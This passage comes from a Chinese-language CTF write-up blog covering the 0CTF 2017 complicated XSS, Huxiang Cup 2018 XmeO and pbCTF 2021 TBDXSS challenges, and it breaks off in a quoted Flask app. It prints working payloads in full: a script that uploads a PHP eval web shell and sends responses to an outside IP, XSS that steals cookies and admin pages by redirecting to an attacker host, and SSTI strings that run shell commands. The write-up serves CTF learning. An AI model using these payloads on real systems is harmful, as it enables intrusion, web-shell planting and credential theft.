&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/upload&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;post&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">input&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;upload&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œå°±éœ€è¦csrfï¼Œä¸è¿‡ç”±äºé¡µé¢ä¸Šçš„XHRè¢«ç¦ç”¨ï¼Œæ‰€ä»¥å¾—é¢å¤–è°ƒç”¨å‡ºæ¥&lt;/p>
&lt;p>test.js&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">getElementById&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;sandbox&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onreadystatechange&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readyState&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//if(xhr.status==200){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res_status&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;status: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">status&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;img&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">imgsrc&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://121.42.175.111:8080/xss/xss_new.php?cookie=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res_status&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">escape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">formData&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">FormData&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php @eval($_POST[c][/c]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">blob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Blob&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#75af00">content&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;text/plain&amp;#34;&lt;/span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">formData&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">blob&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;angelwhutestshell.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;/upload&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">formData&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>é…åˆä¸»ç«™çš„xss payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">xss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;iframe id=\&amp;#34;sandbox\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=//******/xss/test.js&amp;gt;&amp;lt;\/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;username=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">xss&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;testxss;domain=.government.vip;path=\/;&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://admin.government.vip:8000/&amp;#39;&lt;/span>&lt;span style="color:#111">;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°±å¯ä»¥è·å¾—flagäº†&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.angelwhu.com/paper/2017/03/23/0ctf2017-web-topic-summary/#complicated-xss">wp&lt;/a> | &lt;a href="https://www.cdxy.me/?p=764">wp2&lt;/a> | &lt;a href="https://www.40huo.cn/blog/0ctf-2017-writeup.html">wp3&lt;/a> | &lt;a href="https://www.leavesongs.com/HTML/zhihu-xss-worm.html">çŸ¥ä¹æŸå¤„XSS+åˆ·ç²‰è¶…è¯¦ç»†æ¼æ´æŠ€æœ¯åˆ†æ&lt;/a>&lt;/p>
&lt;h2 id="æ¹–æ¹˜æ¯-2018xmeo">[æ¹–æ¹˜æ¯ 2018]XmeO&lt;/h2>
&lt;h3 id="é¢„æœŸ---ssti">é¢„æœŸ - SSTI&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls -r /*/*&amp;#34;).read()&amp;#39;)}}
&lt;/code>&lt;/pre>&lt;p>å‘ç°webç›®å½•ä¸º&lt;code>/home/XmeO&lt;/code>ï¼Œç„¶ågrepæœç´¢flagå­—ç¬¦&lt;/p>
&lt;pre tabindex="0">&lt;code>{{&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;grep hxb2018{ /home/XmeO/*&amp;#34;).read()&amp;#39;)}}
&lt;/code>&lt;/pre>&lt;h3 id="éé¢„æœŸ---xss">éé¢„æœŸ - xss&lt;/h3>
&lt;p>é€šè¿‡æŸ¥çœ‹è¿›ç¨‹å‘ç°è¿è¡Œç€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220215203100071.png" alt="image-20220215203100071">&lt;/p>
&lt;p>åœ¨/static/assets/js/me.jsä¸­å’Œä¸Šé¢0CTFé‚£ä¸ªé¢˜æœ‰ä¸€æ ·çš„æ²™ç›’æƒ…å†µï¼Œå“åº”å¤´&lt;/p>
&lt;pre tabindex="0">&lt;code>script-src &amp;#39;self&amp;#39;
&lt;/code>&lt;/pre>&lt;p>è¯´æ˜ä¸å…è®¸å†…è”è„šæœ¬æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç›´æ¥åµŒå¥—åœ¨&lt;code>&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code>ä¸­çš„ä»£ç æ— æ³•è¢«æ‰§è¡Œï¼Œè€Œ&lt;code>&amp;lt;script src='url'&amp;gt;&amp;lt;/script&amp;gt;&lt;/code>ä¸­çš„ä»£ç å°†è¢«æ‰§è¡Œï¼Œè€Œä¸”å¿…é¡»åŒæºï¼ˆå¾ˆç»å…¸çš„ç»•è¿‡æ–¹å¼ï¼Œä¹Ÿå¯æ¢æˆiframe&lt;/p>
&lt;p>åå°è¯·æ±‚çš„urlä¸º&lt;code>http://127.0.0.1:7443/admin/&lt;/code>ï¼Œæäº¤xss payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">div&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#75af00">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">http://127.0.0.1:7443/show/591b111c-096d-11eb-97c4-0242ac110003&lt;/span>&lt;span style="color:#111">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">div&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è·å–åˆ°hint&lt;/p>
&lt;pre tabindex="0">&lt;code>/?hint=Try%20to%20get%20admin&amp;#39;s%20page%20content
&lt;/code>&lt;/pre>&lt;p>ç”±äºé¡µé¢çš„æ²™ç›’è®¾ç½®ï¼Œæˆ‘ä»¬åˆ©ç”¨ä¸Šé¢çš„åŒæ¬¾æ–¹å¼è¿›è¡Œç»•è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ifm&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;iframe&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">ifm&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;src&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ifm&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">top&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">frames&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">xhr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">XMLHttpRequest&lt;/span>&lt;span style="color:#111">();&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:7443/admin/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">xhr&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">responseText&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://192.168.0.134:8889/?c=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„hint&lt;/p>
&lt;pre tabindex="0">&lt;code>/?c=%20%20%20%20This%20website%20also%20have%20another%20page%20named%20mysecrecy_directory......
&lt;/code>&lt;/pre>&lt;p>é—®é¢˜è½¬å˜ä¸ºè·å–&lt;code>/admin/mysecrecy_directory&lt;/code>ä¸‹çš„cookieå†…å®¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;iframe&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setAttribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;src&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/mysecrecy_directory&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">contentWindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">location&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">href&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://192.168.0.134:8889/?&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payloadåªéœ€è¦æŠŠä¹‹å‰çš„srcæ”¹ä¸€ä¸‹ï¼Œåœ¨iframeåŠ è½½çš„åŒæ—¶è·å–iframeä¸­çš„cookieï¼Œå¹¶åˆ©ç”¨hrefè·³è½¬è·å–flag&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.anquanke.com/post/id/220436">wp&lt;/a>&lt;/p>
&lt;h2 id="uiuctf-2021yana">[uiuCTF 2021]YANA&lt;/h2>
&lt;p>å†™è¿‡å¤ªå¤šæ¬¡äº†ï¼Œä¸è¯¦ç»†å±•å¼€äº†ï¼›å…³äºç¼“å­˜æŠ•æ¯’ + å­åŸŸåæ¥ç®¡ + XS-Leaks â‰ˆ å¯„&lt;/p>
&lt;h2 id="pbctf-2021tbdxss">[pbCTF 2021]TBDXSS&lt;/h2>
&lt;p>&lt;del>æ•‘å•Š åˆæ˜¯xss&lt;/del> ç»™å‡ºäº†è¯¦ç»†çš„æºç ï¼Œapp.py+bot.js&lt;/p>
&lt;p>&lt;a href="https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss">https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html">https://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS">https://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">jsonify&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">redis&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
